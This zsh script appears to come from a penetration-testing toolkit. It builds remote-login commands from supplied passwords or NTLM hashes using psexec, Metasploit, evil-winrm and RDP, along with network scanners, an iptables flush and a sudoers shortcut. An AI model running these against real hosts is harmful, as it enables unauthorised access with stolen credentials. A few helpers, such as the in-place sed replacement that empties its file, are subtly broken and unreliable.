#!/usr/bin/env zsh

############################################################# 
# nb-os
#############################################################
nb-os-help() {
    cat << "DOC" | bat --plain --language=help

nb-os
----------
The nb-os namespace provides commands that assist with managing your OS.

Commands
--------
nb-os-rdp                  connect via rdp to a target host
nb-os-evil-winrm           connect via winrm to a target host
nb-os-psexec               connect via psexec to a target host
nb-os-psexec-msf           connect via metasploit's psexec to a target host

nb-os-pkg-query            query if a package is installed or not  
nb-os-flush-iptables       flushes ip tables
nb-os-get-gateway          get router IP address
nb-os-get-hosts            get list of host IP addresses found via nmap
nb-os-get-hostnames        get list of host names using nmap and the IP of a known DNS server
nb-os-download-html        download IP and print with html2text
nb-os-scan-tcp             scan IP with masscan
nb-os-scan-udp             scan IP with nmap
nb-os-ps-grep              search list of processes
nb-os-ps-dtach             run a script in the background
nb-os-path-add             add a new path to the PATH environment variable
nb-os-file-replace         replace an existing value in a file
nb-os-file-dos-to-unix     convert file with dos endings to unix
nb-os-file-unix-to-dos     convert file with unix endings to dos
nb-os-file-sort-uniq       sort a file uniq in place 
nb-os-file-sort-uniq-ip    sort a file of IP addresses uniq in place
nb-os-sudoers-easy         removes the requirment for sudo for common commands like nmap
nb-os-sudoers-harden       removes sudo exclusions

DOC
}

nb-os-psexec() {
  nb-vars-set-rhost
  nb-vars-set-user
  echo

  __ask "Do you want to log in using a password or a hash? (p/h)"
  local login && __askvar login "LOGIN_OPTION"

  if [[ $login == "p" ]]; then
      __ask "Do you want to add a domain? (y/n)"
      local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

      if [[ $add_domain == "y" ]]; then
          __ask "Enter the domain"
          nb-vars-set-domain
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "psexec.py ${__DOMAIN}/${__USER}:'${__PASS}'@${__RHOST}"
      else
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "psexec.py ${__USER}:'${__PASS}'@${__RHOST}"
      fi
  elif [[ $login == "h" ]]; then
      echo
      __ask "Enter the NTLM hash for authentication"
      __check-hash
      print -z "psexec.py ${__USER}@${__RHOST} -hashes :${__HASH}"
  else
      echo
      __err "Invalid option. Please choose 'p' for password or 'h' for hash."
  fi
}

nb-os-psexec-msf() {
  nb-vars-set-rhost
  nb-vars-set-user
  echo

  __ask "Do you want to log in using a password or a hash? (p/h)"
  local login && __askvar login "LOGIN_OPTION"

  if [[ $login == "p" ]]; then
      __ask "Do you want to add a domain? (y/n)"
      local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"

      if [[ $add_domain == "y" ]]; then
          __ask "Enter the domain"
          nb-vars-set-domain
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "msfconsole -q -x \"use exploit/windows/smb/psexec ; set rhosts ${__RHOST} ; set smbdomain ${__DOMAIN} ; set smbuser ${__USER} ; set smbpass ${__PASS} ; run\""
      else
          __ask "Enter a password for authentication"
          nb-vars-set-pass
          print -z "msfconsole -q -x \"use exploit/windows/smb/psexec ; set rhosts ${__RHOST} ; set smbuser ${__USER} ; set smbpass ${__PASS} ; run\""
      fi
  elif [[ $login == "h" ]]; then
      echo
      __ask "Enter the NTLM hash for authentication"
      __check-hash
      print -z "msfconsole -q -x \"use exploit/windows/smb/psexec ; set rhosts ${__RHOST} ; set smbuser ${__USER} ; set smbpass ${__HASH} ; run\""
  else
      echo
      __err "Invalid option. Please choose 'p' for password or 'h' for hash."
  fi
}

nb-os-rdp() {
  nb-vars-set-rhost
  nb-vars-set-user
  echo

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        __ask "Enter a password for authentication"
        nb-vars-set-pass
        print -z "wlfreerdp /v:${__RHOST} /u:'${__USER}' /p:'${__PASS}'"
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z "wlfreerdp /v:${__RHOST} /u:'${__USER}' /pth:'${__HASH}'"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-os-evil-winrm() {
  nb-vars-set-rhost
  nb-vars-set-user

  echo
  __ask "Do you want to log in using a password or a hash? (p/h)"
  local login && __askvar login "LOGIN_OPTION"

  if [[ $login == "p" ]]; then
      echo
      __ask "Enter a password for authentication"
      __check-pass
      print -z "evil-winrm -i ${__RHOST} -u '${__USER}' -p '${__PASS}'"
  elif [[ $login == "h" ]]; then
      echo
      __ask "Enter the NTLM hash for authentication"
      __check-hash
      print -z "evil-winrm -i ${__RHOST} -u '${__USER}' -H '${__HASH}'"
  else
      echo
      __err "Invalid option. Please choose 'p' for password or 'h' for hash."
  fi
}

nb-os-pkg-query() {
    local query && __askvar query PACKAGE 
    for pkg in "${query}"
    do
    pacman -Q | grep -qw $pkg && __ok "${pkg} is installed" || __warn "${pkg} not installed"
    done 
}

nb-os-flush-iptables() {
    echo ""
    echo ">>> Before flush <<<"
    echo "" 
    iptables -L
    iptables -F
    iptables -X
    iptables -t nat -F
    iptables -t nat -X
    iptables -t mangle -F
    iptables -t mangle -X
    iptables -t raw -F
    iptables -t raw -X
    iptables -P INPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -P OUTPUT ACCEPT
    echo ""
    echo ""
    echo ">>> After flush <<<"
    echo "" 
    iptables -L
    echo ""
}

nb-os-get-gateway() {
   INTERFACE=${1:-tap0}
   ip route | grep via | grep "$INTERFACE" | cut -d" " -f3 
}

nb-os-get-hosts() {
    PORT=${1:-"none"}
    NETWORK=${2:-"10.11.1.0"}
    PATTERN="Nmap scan report for ${NETWORK:0:-1}"

    get_ip() {
        cut -d" " -f5 $1
    }
	
    if [[ $PORT == "none" ]]; then
        print -z 'grc nmap "$NETWORK"/24 -sn | grep "$PATTERN" | get_ip'
    else
        print -z 'grc nmap "$NETWORK"/24 -p "$PORT" --open | grep "$PATTERN" | get_ip'
    fi
}

nb-os-get-hostnames() {
    DNS=$1
    NETWORK=${2:-"10.11.1.0"}
    PATTERN="Nmap scan report for "

    get_ip() {
        cut -d" " -f5- $1
    }

    if [[ ${#1} -gt 0 ]]; then
        grc nmap "$NETWORK"/24 --dns-server "$DNS" -sn | grep "$PATTERN" | get_ip
    else
        echo "DNS server address required"
    fi
}

nb-os-download-html() { 
	curl -s "${1:-$RHOST}:${80:-$RPORT}" | html2text -style pretty; 
}

nb-os-scan-tcp() {
    IP=${1:-${__RHOST}
    INTERFACE=${2:-"tap0"}
    SAVEPATH=$(create_scan_directory "$IP")
	
    run() {
        masscan "$1" -e "$INTERFACE" --router-ip "$(nb-os-get-gateway "$INTERFACE")" -p 0-65535 --rate 500 -oL "$SAVEPATH"/ports
    }
	
    run "$IP"
}

nb-os-scan-udp() {
    IP=${1:-$RHOST}
    SAVEPATH=$(create_scan_directory "$IP")
	
    run() {
        grc nmap -sU -T4 --open --max-retries 1 "$1" -oX "$SAVEPATH"/ports-udp.xml
    }
	
    run "$IP"
}

nb-os-ps-grep() { 
    local query && __askvar query QUERY 
    print -z "ps aux | grep -v grep | grep -i -e VSZ -e ${query}" 
}

nb-os-ps-dtach() { 
    __ask "Enter full path to script to run dtach'd"
    local p && __askpath p PATH $(pwd)
    dtach -A ${p} /bin/zsh 
}

nb-os-path-add() { 
    __ask "Enter new path to append to current PATH"
    local p && __askpath p PATH /   
    print -z "echo \"export PATH=\$PATH:${p}\" | tee -a $HOME/.zshrc" 
}

nb-os-file-replace() {
    local replace && __askvar replace REPLACE
    local with && __askvar with WITH
    local file && __askpath file FILE $(pwd)
    print -z "sed 's/${replace}/${with}/g' ${file} > ${file}"
} 

nb-os-file-dos-to-unix() { 
    local file=$1 
    [[ -z "${file}" ]] && __askpath file FILE $(pwd)
    print -z "tr -d \"\015\" < ${file} > ${file}.unix"
}

nb-os-file-unix-to-dos() {
    local file=$1 
    [[ -z "${file}" ]] && __askpath file FILE $(pwd)
    print -z "sed -e 's/$/\r/' ${file} > ${file}.dos"
}

nb-os-file-sort-uniq() {
    local file=$1 
    [[ -z "${file}" ]] && __askpath file FILE $(pwd)
    print -z "cat ${file} | sort -u -o ${file}"
}

nb-os-file-sort-uniq-ip() { 
    local file=$1 
    [[ -z "${file}" ]] && __askpath file FILE $(pwd)
    print -z "cat ${file} | sort -u | sort -V -o ${file}"
}

nb-os-sudoers-easy() {
    __warn "This is dangerous for OPSEC! Remove when done."
	
    print -z "echo \"$USER ALL=(ALL:ALL) NOPASSWD: /usr/bin/nmap, /usr/bin/masscan, /usr/sbin/tcpdump\" | sudo tee /etc/sudoers.d/$(whoami)"
}

nb-os-sudoers-harden() {
    print -z "sudo rm /etc/sudoers.d/$(whoami)"
}
